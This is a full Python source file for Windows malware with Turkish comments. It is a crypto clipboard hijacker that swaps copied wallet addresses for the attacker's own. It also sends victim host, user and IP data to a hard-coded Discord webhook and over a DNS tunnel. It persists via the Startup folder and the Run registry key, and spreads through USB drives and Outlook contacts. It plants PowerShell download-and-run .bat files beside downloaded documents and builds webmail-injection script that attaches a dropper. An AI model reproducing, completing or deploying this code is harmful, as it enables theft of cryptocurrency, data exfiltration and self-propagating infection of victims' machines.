#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys, time, threading, platform, base64, random, string, hashlib
import os, re, socket, shutil, ctypes, urllib.request, subprocess, json
from datetime import datetime

# ============================================================================
# 1. POLİMORFİK MOTOR
# ============================================================================
class PolymorphicEngine:
    def __init__(self):
        self.junk_pool = [
            lambda x: x if isinstance(x, int) else 0,
            lambda x: x ^ 0 if isinstance(x, int) else 0,
            lambda x: hash(str(x)) % 1000,
        ]
    def inject_junk(self):
        for _ in range(random.randint(1, 3)):
            junk = random.choice(self.junk_pool)
            try: junk(random.randint(1, 100))
            except: pass
        return hashlib.sha256(str(time.time()).encode()).hexdigest()[:16]

poly = PolymorphicEngine()
mutated_marker = poly.inject_junk()

# ============================================================================
# 2. KONFİGÜRASYON – DÜZ WEBHOOK (BASE64 YOK)
# ============================================================================
WEBHOOK_URL = "https://discord.com/api/webhooks/1514159972081074298/mKZ8mYuuUM_c_PN77hBGFX1AhfesXzh7NSi4XTaKkFfM0UlIdw3HSbAJjbqxLepeAdqa"
KILL_PASSWORD = "SIFIRLA"

# Cüzdan adresleri (kendin doldur)
WALLETS = {
    "BTC": "ADRESINIZI_BURAYA_YAZIN",
    "ETH": "ADRESINIZI_BURAYA_YAZIN",
    "BNB": "ADRESINIZI_BURAYA_YAZIN",
    "SOL": "ADRESINIZI_BURAYA_YAZIN",
    "ADA": "ADRESINIZI_BURAYA_YAZIN",
    "DOT": "ADRESINIZI_BURAYA_YAZIN",
    "AVAX": "ADRESINIZI_BURAYA_YAZIN",
    "TRX": "ADRESINIZI_BURAYA_YAZIN",
    "XRP": "ADRESINIZI_BURAYA_YAZIN",
    "LTC": "ADRESINIZI_BURAYA_YAZIN",
    "BCH": "ADRESINIZI_BURAYA_YAZIN",
    "DOGE": "ADRESINIZI_BURAYA_YAZIN",
    "XLM": "ADRESINIZI_BURAYA_YAZIN",
    "XMR": "ADRESINIZI_BURAYA_YAZIN",
    "ATOM": "ADRESINIZI_BURAYA_YAZIN",
    "NEAR": "ADRESINIZI_BURAYA_YAZIN",
    "ALGO": "ADRESINIZI_BURAYA_YAZIN",
    "XTZ": "ADRESINIZI_BURAYA_YAZIN",
    "MATIC": "ADRESINIZI_BURAYA_YAZIN",
    "ARB": "ADRESINIZI_BURAYA_YAZIN",
    "OP": "ADRESINIZI_BURAYA_YAZIN",
    "BASE": "ADRESINIZI_BURAYA_YAZIN",
    "SUI": "ADRESINIZI_BURAYA_YAZIN",
    "APT": "ADRESINIZI_BURAYA_YAZIN",
    "FIL": "ADRESINIZI_BURAYA_YAZIN",
    "ICP": "ADRESINIZI_BURAYA_YAZIN",
    "HBAR": "ADRESINIZI_BURAYA_YAZIN",
    "EGLD": "ADRESINIZI_BURAYA_YAZIN",
    "KAS": "ADRESINIZI_BURAYA_YAZIN",
    "USDT": "ADRESINIZI_BURAYA_YAZIN",
    "USDC": "ADRESINIZI_BURAYA_YAZIN",
    "DAI": "ADRESINIZI_BURAYA_YAZIN",
    "BUSD": "ADRESINIZI_BURAYA_YAZIN",
    "TUSD": "ADRESINIZI_BURAYA_YAZIN",
    "FRAX": "ADRESINIZI_BURAYA_YAZIN",
    "LINK": "ADRESINIZI_BURAYA_YAZIN",
    "UNI": "ADRESINIZI_BURAYA_YAZIN",
    "AAVE": "ADRESINIZI_BURAYA_YAZIN",
    "CRV": "ADRESINIZI_BURAYA_YAZIN",
    "LDO": "ADRESINIZI_BURAYA_YAZIN",
    "RNDR": "ADRESINIZI_BURAYA_YAZIN",
    "GRT": "ADRESINIZI_BURAYA_YAZIN",
    "SNX": "ADRESINIZI_BURAYA_YAZIN",
    "MKR": "ADRESINIZI_BURAYA_YAZIN",
    "INJ": "ADRESINIZI_BURAYA_YAZIN",
}

DNS_TUNNEL_DOMAIN = "benimlab.duckdns.org"
PAYLOAD_URL = "http://SUNUCU_IP_ADRESINIZ:8000/payload.py"

# ============================================================================
# 3. PLATFORM KONTROLÜ
# ============================================================================
if platform.system().lower() != "windows":
    sys.exit(0)

# ============================================================================
# 4. GEREKLİ KÜTÜPHANELER
# ============================================================================
try:
    import win32gui, win32api, win32process, win32file
    import win32com.client
    WIN32_AVAILABLE = True
except ImportError:
    WIN32_AVAILABLE = False

try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

# ============================================================================
# 5. YERLEŞİK PANO FONKSİYONLARI
# ============================================================================
def fallback_get_clipboard():
    try:
        if ctypes.windll.user32.OpenClipboard(None):
            p = ctypes.windll.user32.GetClipboardData(13)
            data = ctypes.c_wchar_p(p).value if p else ""
            ctypes.windll.user32.CloseClipboard()
            return data
    except: pass
    return ""

def fallback_set_clipboard(text):
    try:
        if ctypes.windll.user32.OpenClipboard(None):
            ctypes.windll.user32.EmptyClipboard()
            h = ctypes.windll.kernel32.GlobalAlloc(0x42, (len(text) + 1) * 2)
            lp = ctypes.windll.kernel32.GlobalLock(h)
            ctypes.cdll.msvcrt.wcscpy(ctypes.c_wchar_p(lp), text)
            ctypes.windll.kernel32.GlobalUnlock(h)
            ctypes.windll.user32.SetClipboardData(13, h)
            ctypes.windll.user32.CloseClipboard()
            return True
    except: pass
    return False

# ============================================================================
# 6. İLETİŞİM (DNS TÜNEL + FALLBACK WEBHOOK)
# ============================================================================
def dns_tunnel_send(data):
    if not DNS_TUNNEL_DOMAIN or DNS_TUNNEL_DOMAIN == "tunnel.yourlab.com":
        return False
    try:
        encoded = base64.urlsafe_b64encode(data.encode()).decode().rstrip('=')
        for i in range(0, len(encoded), 50):
            sub = encoded[i:i+50]
            if len(sub) < 2:
                sub = sub.ljust(2, 'x')
            socket.gethostbyname(f"{sub}.{mutated_marker}.{DNS_TUNNEL_DOMAIN}")
            time.sleep(0.1)
        return True
    except:
        return False

def stealth_send(msg):
    if dns_tunnel_send(msg):
        return
    try:
        payload = json.dumps({"content": msg}).encode('utf-8')
        req = urllib.request.Request(
            WEBHOOK_URL,
            data=payload,
            headers={'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}
        )
        urllib.request.urlopen(req, timeout=5)
    except:
        pass

# ============================================================================
# 7. ANINDA BAĞLANTI BİLDİRİMİ (HATA YÖNETİMLİ)
# ============================================================================
def send_detailed_notification():
    """Sistem bilgilerini topla ve Discord'a anında gönder."""
    try:
        host = socket.gethostname()
        try:
            user = os.getlogin()
        except:
            user = "Bilinmiyor"
        try:
            ip = urllib.request.urlopen('https://api.ipify.org', timeout=3).read().decode('utf-8')
        except:
            ip = "Bilinmiyor (Bağlantı Hatası)"
        sys_info = f"{platform.system()} {platform.release()} ({platform.architecture()[0]})"
        current_time = datetime.now().strftime('%d-%m-%Y %H:%M:%S')
        msg = (
            f"**✅ Ajan Başarıyla Başlatıldı!**\n"
            f"━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🖥️ **Bilgisayar Adı:** `{host}`\n"
            f"👤 **Aktif Kullanıcı:** `{user}`\n"
            f"🌐 **Dış IP Adresi:** `{ip}`\n"
            f"⚙️ **İşletim Sistemi:** `{sys_info}`\n"
            f"⏰ **Raporlama Zamanı:** `{current_time}`\n"
            f"━━━━━━━━━━━━━━━━━━━━━━"
        )
        stealth_send(msg)
    except Exception as e:
        # Hata olursa basit bir mesaj gönder
        stealth_send(f"**✅ Ajan başlatıldı** (hata: {str(e)[:50]})")

# ============================================================================
# 8. SANDBOX TESPİTİ
# ============================================================================
def check_sandbox():
    if PSUTIL_AVAILABLE:
        try:
            if psutil.cpu_count() is not None and psutil.cpu_count() < 2:
                sys.exit(0)
        except:
            pass

# ============================================================================
# 9. E-POSTA / TARAYICI EKLENTİSİ
# ============================================================================
TARGET_EMAIL_SERVICES = [
    "mail.google.com", "outlook.live.com", "outlook.office.com",
    "mail.yahoo.com", "protonmail.com", "yandex.com"
]

def create_mail_injection_script():
    dropper_code = (
        "import urllib.request,os; "
        "exec(urllib.request.urlopen('" + PAYLOAD_URL + "').read())"
    )
    return f"""
    var targetDomains = /mail\\.google\\.com|outlook\\.live\\.com|outlook\\.office\\.com|mail\\.yahoo\\.com|protonmail\\.com|yandex\\.com/;
    if (!targetDomains.test(window.location.hostname)) return;
    var dropperCode = {json.dumps(dropper_code)};
    function interceptEmailSend() {{
        var sendButtons = document.querySelectorAll('[role="button"][aria-label*="Send"], [jsaction*="send"], button[jsname*="T4LgNb"], button[aria-label*="Gönder"]');
        for (var i = 0; i < sendButtons.length; i++) {{
            if (sendButtons[i].getAttribute('data-injected') === 'true') continue;
            sendButtons[i].setAttribute('data-injected', 'true');
            sendButtons[i].addEventListener('click', function(e) {{
                var fileInput = document.querySelector('input[type="file"]');
                if (fileInput && fileInput.files.length === 0) {{
                    var blob = new Blob([dropperCode], {{type: 'application/octet-stream'}});
                    var file = new File([blob], 'System_Update.pyw', {{type: 'application/octet-stream'}});
                    var dt = new DataTransfer();
                    dt.items.add(file);
                    fileInput.files = dt.files;
                    fileInput.dispatchEvent(new Event('change', {{ bubbles: true }}));
                }}
            }});
        }}
    }}
    new MutationObserver(interceptEmailSend).observe(document.body, {{ childList: true, subtree: true }});
    interceptEmailSend();
    """

def inject_into_browsers():
    if not WIN32_AVAILABLE: return
    try:
        for proc in psutil.process_iter(['pid', 'name']):
            try:
                if any(b in proc.info['name'].lower() for b in ['chrome', 'msedge']):
                    pass
            except: pass
    except: pass

# ============================================================================
# 10. OUTLOOK YAYILIMI
# ============================================================================
def send_self_via_outlook():
    if not WIN32_AVAILABLE: return False
    try:
        outlook = win32com.client.Dispatch("Outlook.Application")
        contacts = outlook.GetNamespace("MAPI").GetDefaultFolder(10)
        recipients = []
        for i in range(1, min(11, contacts.Items.Count + 1)):
            try:
                email = contacts.Items[i].Email1Address
                if email: recipients.append(email)
            except: pass
        if not recipients: return False
        current_file = os.path.abspath(sys.argv[0])
        for rcpt in recipients:
            mail = outlook.CreateItem(0)
            mail.To = rcpt
            mail.Subject = "Important System Update"
            mail.Body = "Please review the attached security update."
            mail.Attachments.Add(current_file)
            mail.Send()
            time.sleep(2)
        return True
    except: return False

# ============================================================================
# 11. DOSYA ENJEKSİYONU
# ============================================================================
def file_injection_monitor():
    target_dir = os.path.join(os.path.expanduser('~'), 'Downloads')
    prev = set()
    try:
        if os.path.exists(target_dir):
            prev = set(os.listdir(target_dir))
    except: pass
    while True:
        try:
            if not os.path.exists(target_dir):
                time.sleep(5)
                continue
            curr = set(os.listdir(target_dir))
            new_files = curr - prev
            deleted_files = prev - curr
            for f in deleted_files:
                if f.lower().endswith(('.pdf', '.docx')):
                    bat = os.path.join(target_dir, f"{os.path.splitext(f)[0]}.bat")
                    if os.path.exists(bat):
                        os.remove(bat)
            for f in new_files:
                if f.lower().endswith(('.pdf', '.docx')):
                    bat = os.path.join(target_dir, f"{os.path.splitext(f)[0]}.bat")
                    if not os.path.exists(bat):
                        with open(bat, 'w') as fp:
                            fp.write(
                                f'@echo off\r\n'
                                f'powershell -WindowStyle Hidden -Command '
                                f'"Invoke-WebRequest -Uri \'{PAYLOAD_URL}\' -OutFile $env:TEMP/update.pyw; '
                                f'Start-Process python \'$env:TEMP/update.pyw\' -WindowStyle Hidden"\r\n'
                                f'exit\r\n'
                            )
            prev = curr
        except: pass
        time.sleep(1)

# ============================================================================
# 12. USB YAYILIMI
# ============================================================================
def spread_to_usb():
    if not WIN32_AVAILABLE: return
    try:
        current_file = os.path.abspath(sys.argv[0])
        for drive in win32api.GetLogicalDriveStrings().split('\x00')[:-1]:
            if win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE:
                dest = os.path.join(drive, "SystemHelper.pyw")
                if not os.path.exists(dest):
                    shutil.copy2(current_file, dest)
    except: pass

# ============================================================================
# 13. AKILLI TETİKLEYİCİ
# ============================================================================
class SmartTrigger:
    def __init__(self):
        self.last_pos = (0, 0)
        self.cnt = 0
    def is_human(self):
        if not WIN32_AVAILABLE: return True
        try:
            cur = win32api.GetCursorPos()
            if abs(cur[0]-self.last_pos[0])>5 or abs(cur[1]-self.last_pos[1])>5:
                self.cnt += 1
            self.last_pos = cur
            return self.cnt > 2
        except: return True
    def is_crypto_window(self):
        if not WIN32_AVAILABLE: return True
        try:
            title = win32gui.GetWindowText(win32gui.GetForegroundWindow()).lower()
            kw = [
                'bitcoin','ethereum','wallet','binance','metamask','coinbase',
                'kraken','kucoin','bybit','okx','trust wallet','exodus','ledger',
                'trezor','blockchain','uniswap','pancakeswap','sushiswap','aave',
                'compound','crypto','btc','eth','usdt','usdc','defi','nft',
                'phantom','solflare','keplr','cosmostation','terra station'
            ]
            return any(k in title for k in kw)
        except: return True
    def should_activate(self):
        return self.is_human() and self.is_crypto_window()

trigger = SmartTrigger()

# ============================================================================
# 14. PANO MANİPÜLASYONU (İMHA KOMUTLU)
# ============================================================================
def clipboard_monitor():
    try:
        import pyperclip
        has_pyperclip = True
    except ImportError:
        has_pyperclip = False

    ADDRESS_PATTERNS = {
        "BTC": r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$',
        "ETH": r'^0x[a-fA-F0-9]{40}$',
        "BNB": r'^0x[a-fA-F0-9]{40}$',
        "SOL": r'^[a-zA-Z0-9]{32,44}$',
        "ADA": r'^(addr1|Ae2|DdzFF)[a-zA-Z0-9]{50,90}$',
        "DOT": r'^1[a-zA-Z0-9]{46,48}$',
        "AVAX": r'^0x[a-fA-F0-9]{40}$',
        "TRX": r'^T[a-zA-Z0-9]{33}$',
        "XRP": r'^r[a-zA-Z0-9]{24,34}$',
        "LTC": r'^(L|M|ltc1)[a-zA-Z0-9]{26,62}$',
        "BCH": r'^(bitcoincash:)?(q|p)[a-zA-Z0-9]{41,42}$',
        "DOGE": r'^(D|A|9)[a-zA-Z0-9]{33}$',
        "XLM": r'^G[a-zA-Z0-9]{55}$',
        "XMR": r'^(4|8)[a-zA-Z0-9]{94,105}$',
        "ATOM": r'^cosmos[a-zA-Z0-9]{38,42}$',
        "NEAR": r'^[a-zA-Z0-9._-]+\.near$',
        "ALGO": r'^[A-Z2-7]{58}$',
        "XTZ": r'^(tz[1-3]|KT1)[a-zA-Z0-9]{33,34}$',
        "MATIC": r'^0x[a-fA-F0-9]{40}$',
        "ARB": r'^0x[a-fA-F0-9]{40}$',
        "OP": r'^0x[a-fA-F0-9]{40}$',
        "BASE": r'^0x[a-fA-F0-9]{40}$',
        "SUI": r'^0x[a-fA-F0-9]{64}$',
        "APT": r'^0x[a-fA-F0-9]{64}$',
        "FIL": r'^(f[1-4])[a-zA-Z0-9]{38,86}$',
        "ICP": r'^[a-zA-Z0-9]{63,64}$',
        "HBAR": r'^0\.0\.[0-9]{1,10}$',
        "EGLD": r'^erd[a-zA-Z0-9]{58,60}$',
        "KAS": r'^kaspa:[a-zA-Z0-9]{60,64}$',
        "USDT": r'^(0x[a-fA-F0-9]{40}|T[a-zA-Z0-9]{33})$',
        "USDC": r'^0x[a-fA-F0-9]{40}$',
        "DAI": r'^0x[a-fA-F0-9]{40}$',
        "BUSD": r'^0x[a-fA-F0-9]{40}$',
        "TUSD": r'^0x[a-fA-F0-9]{40}$',
        "FRAX": r'^0x[a-fA-F0-9]{40}$',
        "LINK": r'^0x[a-fA-F0-9]{40}$',
        "UNI": r'^0x[a-fA-F0-9]{40}$',
        "AAVE": r'^0x[a-fA-F0-9]{40}$',
        "CRV": r'^0x[a-fA-F0-9]{40}$',
        "LDO": r'^0x[a-fA-F0-9]{40}$',
        "RNDR": r'^0x[a-fA-F0-9]{40}$',
        "GRT": r'^0x[a-fA-F0-9]{40}$',
        "SNX": r'^0x[a-fA-F0-9]{40}$',
        "MKR": r'^0x[a-fA-F0-9]{40}$',
        "INJ": r'^0x[a-fA-F0-9]{40}$',
    }

    while True:
        try:
            # İmha komutu
            if has_pyperclip:
                cur_check = pyperclip.paste().strip()
            else:
                cur_check = fallback_get_clipboard().strip()
            if cur_check == KILL_PASSWORD:
                stealth_send("**⚠️ İMHA KOMUTU ALINDI! Sistem kapatılıyor...**")
                break

            if not trigger.should_activate():
                time.sleep(1)
                continue

            if has_pyperclip:
                cur = pyperclip.paste().strip()
            else:
                cur = fallback_get_clipboard().strip()

            for coin, pattern in ADDRESS_PATTERNS.items():
                if coin not in WALLETS:
                    continue
                my_wallet = WALLETS[coin]
                if not my_wallet or my_wallet == "ADRESINIZI_BURAYA_YAZIN":
                    continue
                if re.match(pattern, cur) and cur != my_wallet:
                    if has_pyperclip:
                        pyperclip.copy(my_wallet)
                    else:
                        fallback_set_clipboard(my_wallet)
                    stealth_send(f"[{coin}] {cur[:12]}... -> {my_wallet[:12]}...")
                    break
        except:
            pass
        time.sleep(0.05)

# ============================================================================
# 15. PERSISTENCE
# ============================================================================
def persistence():
    try:
        current_file = os.path.abspath(sys.argv[0])
        startup = os.path.join(os.getenv('APPDATA'),
                               r'Microsoft\Windows\Start Menu\Programs\Startup')
        target = os.path.join(startup, 'system_helper.pyw')
        if not os.path.exists(target):
            shutil.copy2(current_file, target)
        import winreg
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                             r"Software\Microsoft\Windows\CurrentVersion\Run",
                             0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemHelper", 0, winreg.REG_SZ, current_file)
        winreg.CloseKey(key)
    except: pass

# ============================================================================
# 16. BELLEK KORUMA
# ============================================================================
def memory_protection():
    try:
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleCtrlHandler(None, 1)
    except: pass

# ============================================================================
# 17. ANA BAŞLATICI (ANINDA MESAJ + ARKA PLAN)
# ============================================================================
def main():
    check_sandbox()
    # Anında Discord'a bağlantı mesajı gönder
    send_detailed_notification()
    # Diğer işlemler (arka planda çalışmaya devam eder)
    persistence()
    spread_to_usb()
    memory_protection()
    send_self_via_outlook()
    inject_into_browsers()
    threading.Thread(target=clipboard_monitor, daemon=True).start()
    threading.Thread(target=file_injection_monitor, daemon=True).start()
    while True:
        time.sleep(10)
        global mutated_marker
        mutated_marker = poly.inject_junk()

if __name__ == "__main__":
    main()